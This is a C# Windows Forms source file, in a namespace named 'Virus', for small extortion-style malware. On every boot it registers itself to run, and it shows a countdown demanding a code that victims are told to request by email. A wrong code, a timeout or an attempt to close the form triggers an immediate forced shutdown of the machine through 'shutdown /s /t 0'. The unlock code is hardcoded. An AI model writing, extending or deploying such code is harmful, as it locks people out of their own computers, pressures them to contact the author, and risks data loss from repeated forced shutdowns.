using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Virus
{
    public partial class Form1 : Form
    {
        int t = 8;
        public static bool isAuthenticated = false;
        public static bool isExit = false;
        public Form1()
        {
            
            InitializeComponent();
            
            RemoveFromStartUP.RemoveApplicationFromStartup();
            StartUp.AddApplicationToStartup();

            timer1.Start();

            label1.Visible = true;
            label1.Text = "Submit the code within " + t + " seconds";
            label1.BackColor = Color.Transparent;
            textBox1.PasswordChar = '*';

            label2.BackColor = Color.Transparent;
            label2.Text = "contact with shoukhin1993@gmail.com for code!!";

            label3.BackColor = Color.Transparent;
            label3.Text = "V 1.0.0.1";

            
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            t--;
            label1.Text = "Submit the code within " + t + " seconds";
            

            if(t <= 0)
            {
                isAuthenticated = false;
                isExit = true;
                Application.Exit();
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (textBox1.Text == "mojaloi")
            {
                timer1.Stop();
                label1.Text = "Authenticated!";
                isAuthenticated = true;
                RemoveFromStartUP.RemoveApplicationFromStartup();
                Application.Exit();

            }


            else
            {
                isAuthenticated = false;
                isExit = true;
                Application.Exit();
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isAuthenticated)
            {
                
                Application.Exit();
            }

                else if(isExit)
            {
                Application.Exit();
            }


            else
            {
                e.Cancel = true;
            }
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                button1_Click(sender, e);
            }
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            if (isExit)
            {
                   Process.Start("shutdown", "/s /t 0");
            }

            else
                Application.Exit();
        }
    }
}
